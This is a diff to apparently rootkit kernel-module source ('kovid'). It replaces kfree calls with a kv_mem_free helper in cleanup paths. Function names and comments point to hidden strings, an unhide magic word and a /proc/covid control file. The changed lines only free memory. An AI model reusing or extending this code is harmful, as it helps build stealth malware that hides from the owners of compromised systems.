@@ -149,7 +149,7 @@ static void module_remove_modinfo_attrs(struct module *mod)
         if (attr->free)
             attr->free(mod);
     }
-    kfree(mod->modinfo_attrs);
+    kv_mem_free(&mod->modinfo_attrs);
 }
 
 static int module_add_modinfo_attrs(struct module *mod)
@@ -328,9 +328,8 @@ out_attrs:
     if (lkmmod.this_mod->mkobj.mp) {
         sysfs_remove_group(&(lkmmod.this_mod->mkobj.kobj), &lkmmod.this_mod->mkobj.mp->grp);
         if (lkmmod.this_mod->mkobj.mp)
-            kfree(lkmmod.this_mod->mkobj.mp->grp.attrs);
-        kfree(lkmmod.this_mod->mkobj.mp);
-        lkmmod.this_mod->mkobj.mp = NULL;
+            kv_mem_free(&lkmmod.this_mod->mkobj.mp->grp.attrs);
+        kv_mem_free(&lkmmod.this_mod->mkobj.mp);
     }
 
 out_put_kobj:
@@ -470,10 +469,8 @@ static char *load_hidden_string(char *str) {
      *  echo "-f" >/proc/covid
      */
     if (*str == 0) {
-        if (_str) {
-            kfree(_str);
-            _str = NULL;
-        }
+        if (_str)
+            kv_mem_free(&_str);
         goto out;
 
     }
@@ -858,10 +855,9 @@ leave:
 static void __exit kv_cleanup(void) {
     char *magik = get_unhide_magic_word();
     char *hiddenstr;
-    if(magik != NULL) {
-        kfree(magik);
-        magik = NULL;
-    }
+
+    if(magik != NULL)
+        kv_mem_free(&magik);
 
     sys_deinit();
     kv_pid_cleanup();
@@ -883,7 +879,7 @@ static void __exit kv_cleanup(void) {
     kv_md5_show_hashes();
 
     if ((hiddenstr = kv_get_hidden_string()))
-        kfree(hiddenstr);
+        kv_mem_free(&hiddenstr);
 
     prinfo("kovid unloaded.\n");
 }
